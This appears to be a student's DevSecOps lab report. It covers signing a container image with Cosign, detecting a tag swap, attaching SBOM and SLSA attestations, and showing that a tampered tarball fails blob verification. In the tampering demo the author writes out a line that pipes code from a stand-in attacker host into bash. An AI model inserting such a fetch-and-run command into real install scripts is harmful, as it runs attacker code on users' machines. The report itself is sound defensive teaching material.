# Lab 8 — Supply Chain: Signing, Tampering, and Attestation

## Task 1

### 1. Setup

Cosign **v3.0.2** (`cosign version | grep GitVersion` → `v3.0.2`), downloaded from the GitHub release. I checked it against `cosign_checksums.txt` (`46dbdcb5…e8cbfd`) before installing. The local registry is `registry:3` on `127.0.0.1:5000`.

### 2. The digest I signed, and how I picked it

```
localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
```

The lab's filter (`grep '^localhost:5000/'` over `RepoDigests`) picks the local-registry entry and not the Docker Hub one. On this machine, though, the value it returned was wrong:

```
$ docker inspect localhost:5000/juice-shop:v20.0.0 --format '{{range .RepoDigests}}{{println .}}{{end}}'
bkimminich/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
localhost:5000/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
```

Docker here uses the containerd image store. `bkimminich/juice-shop:v20.0.0` is a multi-arch index, and only the `linux/amd64` content was pulled locally. When pushing, Docker said so and pushed only the single-platform manifest:

```
Info -> Not all multiplatform-content is present and only the available single-platform image was pushed
        sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0 -> sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
```

`RepoDigests` still shows the index digest `fd58…`, which **does not exist** in my registry:

```
$ curl -I .../v2/juice-shop/manifests/sha256:fd58bdc9…   -> 404
$ curl -I .../v2/juice-shop/manifests/v20.0.0            -> Docker-Content-Digest: sha256:28870b9d…  (200)
```

`28870b9d…` is the `linux/amd64` entry of the Docker Hub index (`docker buildx imagetools inspect bkimminich/juice-shop:v20.0.0 --raw` lists `linux/amd64 sha256:28870b9d…`). So I took the digest from the **registry's own answer** (`Docker-Content-Digest` for the tag I had just pushed) and saved that in `labs/lab8/results/juice-shop-digest.txt`. The digest you sign should be what the registry serves, not what the local client says it pushed.

The key pair was created with `cosign generate-key-pair` in `labs/lab8/keys/`. The passphrase was randomly generated and kept outside the repository. Trying to stage the private key:

```
$ git add labs/lab8/keys/cosign.key
The following paths are ignored by one of your .gitignore files:
labs/lab8/keys/cosign.key
hint: Use -f if you really want to add them.
```

The first line of defence is `.gitignore:5:*.key`. I also forced it into the index (`git add -f`), ran the Lab 3 hooks with `pre-commit run --files labs/lab8/keys/cosign.key`, and then unstaged it again. Nothing was committed:

```
Detect hardcoded secrets......Failed   (gitleaks, RuleID: private-key, File: labs/lab8/keys/cosign.key, Line: 1)
detect private key............Passed
```

gitleaks catches it with its generic `-----BEGIN … PRIVATE KEY` rule. `detect-private-key` misses it: its fixed list of headers does not include `BEGIN ENCRYPTED SIGSTORE PRIVATE KEY`. Without gitleaks, only `.gitignore` would stop this key.

### 3. Signing and a successful verify

```bash
COSIGN_PASSWORD=… cosign sign --key labs/lab8/keys/cosign.key --tlog-upload=false \
  --allow-insecure-registry --yes "$DIGEST"

cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
  --allow-insecure-registry "$DIGEST"
```

```
Verification for localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The signatures were verified against the specified public key
```

```json
[
  {
    "critical": {
      "identity": {
        "docker-reference": "localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe"
      },
      "image": {
        "docker-manifest-digest": "sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe"
      },
      "type": "https://sigstore.dev/cosign/sign/v1"
    },
    "optional": null
  }
]
```

The signature is stored in the same repository, under a tag derived from the digest. The registry's tag list after signing is `["sha256-28870b9d…", "v20.0.0"]`.

### 4. Swapping the image

`alpine:3.20` was tagged as `localhost:5000/juice-shop:v20.0.0` and pushed over the signed tag:

```
signed:            localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
now (registry):    localhost:5000/juice-shop@sha256:c64c687cbea9300178b30c95835354e34c4e4febc4badfe27102879de0483b5e
now (RepoDigests): localhost:5000/juice-shop@sha256:d9e853e87e55526f6b2917df91a2115c36dd7c696a35be12163d44e6e2a4b6bc
```

The `RepoDigests` / registry mismatch from section 2 shows up again here: `d9e853…` is alpine's multi-arch index and `c64c687…` is the amd64 manifest that was actually pushed. Verification fails for all three ways of naming the swapped image: the digest the registry serves, the tag itself, and the lab's `RepoDigests` value. The output was the same each time:

```
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
    --allow-insecure-registry localhost:5000/juice-shop@sha256:c64c687cbea9300178b30c95835354e34c4e4febc4badfe27102879de0483b5e
WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the signature.
Error: no signatures found
error during command execution: no signatures found
exit=10
```

The original digest still verifies after the swap (exit 0):

```
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
    --allow-insecure-registry localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
Verification for localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe --
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The signatures were verified against the specified public key
[{"critical":{"identity":{"docker-reference":"localhost:5000/juice-shop@sha256:28870b9d…"},"image":{"docker-manifest-digest":"sha256:28870b9d…"},"type":"https://sigstore.dev/cosign/sign/v1"},"optional":null}]
```

### 5. What the signature is bound to

The signature does not cover the name `juice-shop:v20.0.0`. It covers the **manifest digest**: the SHA-256 of the exact manifest bytes, which in turn list the SHA-256 of every layer and of the config. That digest is the `docker-manifest-digest` field inside the signed payload above. A tag is just a movable pointer that anyone with push rights can point at something else, which is what I did. Cosign looked up signatures for the *new* digest, found none, and refused, while the old digest kept its valid signature because its content never changed. If signatures were bound to tags, the signature would mean "someone once approved something called v20.0.0". The attacker's alpine image would inherit that approval just by taking the name, and the check would pass exactly when it matters most. This is also why deployments should pull by digest (as Lab 7's Deployment does) and verify that digest, not the tag.

## Task 2

### 1. SBOM attestation

```bash
COSIGN_PASSWORD=… cosign attest --key labs/lab8/keys/cosign.key --type cyclonedx \
  --predicate labs/lab4/juice-shop.cdx.json \
  --tlog-upload=false --allow-insecure-registry --yes "$DIGEST"

cosign verify-attestation --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
  --allow-insecure-registry --type cyclonedx "$DIGEST" \
  | jq -r '.payload | @base64d | fromjson | .predicate' > labs/lab8/results/sbom-from-attestation.json
```

| SBOM | `.components \| length` |
| ---- | ----------------------: |
| `labs/lab4/juice-shop.cdx.json` (Lab 4 original) | **3069** |
| `labs/lab8/results/sbom-from-attestation.json` (out of the verified attestation) | **3069** |

The counts match. The predicate is also byte-for-byte the same document: `diff <(jq -S . lab4) <(jq -S . extracted)` is empty.

### 2. Second attestation (SLSA provenance)

The predicate was the lab's JSON with `configSource.uri` set to `https://github.com/sedimentt/DevSecOps-Intro`, attached with `--type slsaprovenance` and verified the same way.

`predicateType` of each attestation, read from the verified payload (`jq -r '.payload | @base64d | fromjson | .predicateType'`):

| `--type` | `predicateType` in the verified payload |
| -------- | --------------------------------------- |
| `cyclonedx` | `https://cyclonedx.org/bom` |
| `slsaprovenance` | `https://slsa.dev/provenance/v0.2` |

After both attestations, the referrers index for the digest (tag `sha256-28870b9d…`) holds 3 entries: the signature and the two attestations.

### 3. The decoded statement and where each field came from

The envelope is DSSE with `payloadType: application/vnd.in-toto+json` and one signature. The decoded SLSA statement:

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    {
      "name": "localhost:5000/juice-shop",
      "digest": {
        "sha256": "28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe"
      }
    }
  ],
  "predicate": {
    "builder": { "id": "https://localhost/lab8-student" },
    "buildType": "https://example.com/lab8/local-build",
    "invocation": { "configSource": { "uri": "https://github.com/sedimentt/DevSecOps-Intro" } }
  }
}
```

The CycloneDX statement has the same `_type` and `subject`, with `predicateType: https://cyclonedx.org/bom`.

| Field | Value | Who supplied it |
| ----- | ----- | --------------- |
| `_type` | `https://in-toto.io/Statement/v0.1` | **Cosign**. It always wraps the predicate in an in-toto v0.1 Statement; I never wrote this field. |
| `subject[].name` | `localhost:5000/juice-shop` | **Cosign**, taken from the repository part of the image reference I passed. |
| `subject[].digest.sha256` | `28870b9d…` | **Cosign**, resolved from the image reference. I chose *which* digest by passing it, but Cosign wrote it into the statement, and it is the thing the attestation is bound to. |
| `predicateType` | `https://cyclonedx.org/bom` / `https://slsa.dev/provenance/v0.2` | **Cosign**, mapped from my `--type cyclonedx` / `--type slsaprovenance` flag. I chose the type, Cosign chose the URI. |
| `predicate` | the SBOM / the provenance JSON | **Me**, the `--predicate` file, copied in unchanged. |

### 4. The morning after the next Log4Shell

A signature only tells me that an image is unchanged since someone with the key approved it. It says nothing about what is inside the image. With a signed SBOM attached to each of the two thousand digests, I can run `cosign verify-attestation --type cyclonedx` across the registry and grep the verified predicates for the vulnerable package and version. That gives a list of affected digests in minutes, without pulling or unpacking 2,000 images. I can trust the list, because each inventory is cryptographically tied to the exact digest it describes and was signed by our pipeline, not found lying next to the image. For that to work at 3 a.m., a few things have to be true already:

- every image was attested **at build time**, by CI, and nobody skipped it;
- the SBOM generator actually sees the vulnerable component, including shaded jars, vendored code and static binaries (Lab 4 showed that Syft and Trivy disagree on this);
- the public key, or the keyless identity policy, is known and reachable;
- someone keeps an inventory mapping digests to what is actually deployed, since "affected image in the registry" is not the same as "running in production".

## Bonus

### 1. Sign, verify, tamper

```bash
printf '#!/bin/bash\necho "installing my-tool"\n' > install.sh
tar -czf labs/lab8/results/my-tool.tar.gz install.sh
COSIGN_PASSWORD=… cosign sign-blob --key labs/lab8/keys/cosign.key --yes --tlog-upload=false \
  --bundle labs/lab8/results/my-tool.tar.gz.bundle labs/lab8/results/my-tool.tar.gz
```

The original tarball (`sha256 3513e7df…19b4`):

```
$ cosign verify-blob --key labs/lab8/keys/cosign.pub \
    --bundle labs/lab8/results/my-tool.tar.gz.bundle --insecure-ignore-tlog labs/lab8/results/my-tool.tar.gz
WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.
Verified OK
```

Next, I played the attacker: I appended `curl -s https://attacker.example/x | bash` to `install.sh`, rebuilt the tarball (`sha256 f0578aa2…d38d`) and kept the old bundle:

```
$ cosign verify-blob --key labs/lab8/keys/cosign.pub \
    --bundle labs/lab8/results/my-tool.tar.gz.bundle --insecure-ignore-tlog labs/lab8/results/my-tool.tar.gz
WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.
Error: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
error during command execution: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
exit=1
```

### 2. What a consumer needs, and over which channel

A consumer needs two files besides the artifact:

1. **`my-tool.tar.gz.bundle`** — a Sigstore bundle v0.3 holding the signature and the SHA-256 of the signed file. It **may travel over the same channel** as the artifact (same CDN, same release page). It's useless to an attacker on its own: changing the tarball breaks it, and an attacker can't produce a new valid one without the private key.
2. **`cosign.pub`** — the public key. It **must not** come only from the same channel. If it does, an attacker who controls the CDN replaces all three files.

I checked this with a throw-away attacker key. The modified tarball, signed by the attacker and checked against the attacker's public key served next to it, verifies: `Verified OK`. The same tarball and bundle checked against my real public key fail with `invalid signature`. A signature only protects you if the key comes from a source the attacker doesn't control. This is the key-distribution problem.

### 3. Install instructions that can't hand you a modified script

> **Installing my-tool**
>
> 1. **Once, out of band:** get our public key from a source that is not the download server, e.g. the signed git tag in our repository, our package-manager keyring, or our docs site (a different host). Check its fingerprint against the one printed on that page: `sha256sum cosign.pub` → `bd09fdfb3570fc617451bf977a1bc147592954e3d7af86435b7c29e403ec518c`. Keep this file. Don't download it again with every release.
> 2. Download the release **to a file**, never into a pipe: `curl -fsSLO https://downloads.example/my-tool.tar.gz` and `curl -fsSLO https://downloads.example/my-tool.tar.gz.bundle`.
> 3. Verify with the key you pinned in step 1:
>    `cosign verify-blob --key cosign.pub --bundle my-tool.tar.gz.bundle my-tool.tar.gz`
>    Continue only if it prints `Verified OK`. Any error means stop and report it.
> 4. Only then: `tar -xzf my-tool.tar.gz && bash install.sh`.

`curl | bash` is ruled out by design: a pipe executes bytes before anything can check them, and that is exactly how the modified Codecov uploader ran in thousands of pipelines. The step most projects skip is **step 1**: getting the public key or signer identity out of band and pinning it. Many projects publish a `.sig` or `SHA256SUMS` file next to the download, on the same server, which is the channel Codecov's attackers controlled. That only proves the file and its checksum came from the same place, not that we produced them. In CI the better version of step 1 is keyless signing with Rekor enabled, verified with `--certificate-identity` / `--certificate-oidc-issuer` pinned to our release workflow. The trust anchor then becomes an identity the attacker can't take over, instead of a key file.
